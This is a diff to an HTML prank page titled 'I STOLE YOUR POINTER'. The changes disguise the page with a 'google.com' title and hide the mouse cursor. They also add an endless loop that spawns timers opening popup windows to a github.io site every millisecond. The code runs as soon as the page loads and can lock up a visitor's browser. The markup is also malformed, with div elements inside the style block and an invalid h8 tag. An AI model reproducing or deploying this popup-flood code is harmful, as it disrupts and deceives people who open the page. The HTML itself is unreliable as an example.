@@ -2,11 +2,31 @@
 <html>
 <body>
 <h8>I STOLE YOUR POINTER </h8>
-<audio src="https://github.com/Cassius-root/cassius-root.github.io/blob/6cae404fbb642d9cf415fc6afa1e26636e42ad38/Mzg1ODMxNTIzMzg1ODM3_JzthsfvUY24.MP3" autoplay></audio>
+<title>google.com</title>
 <style>
+*{cursor: none;}
 background{  background-color: #1D1E22;
   cursor: none;
   }
+.container {
+  height: 200px;
+  position: relative;
+  border: 3px solid green;
+}
+
+.center {
+  margin: 0;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  -ms-transform: translate(-50%, -50%);
+  transform: translate(-50%, -50%);
+}
+<div class="container">
+  <div class="center">
+    <button>Click Me</button>
+  </div>
+</div>
 
 body{
   background-color: #1D1E22;
@@ -19,12 +39,13 @@ h8 {
 </style>
 <script>
 	var newWindow;
-	setInterval(function(){
-	 	var RandomX = (Math.random() * 1024) + 1;
-	 	var RandomY = (Math.random() * 768) + 300;
-		var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
-		newWindow = window.open("https://www.youtube.com/watch?v=o-YBDTqX_ZU","test", specs);
- 	 }, 1);
+	while (0 < 1)
+		setInterval(function(){
+	 		var RandomX = (Math.random() * 1024) + 1;
+	 		var RandomY = (Math.random() * 768) + 300;
+			var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
+			newWindow = window.open("cassius-root.github.io","test", specs);
+ 	 	}, 1);
 	   
 </script>
 </body>
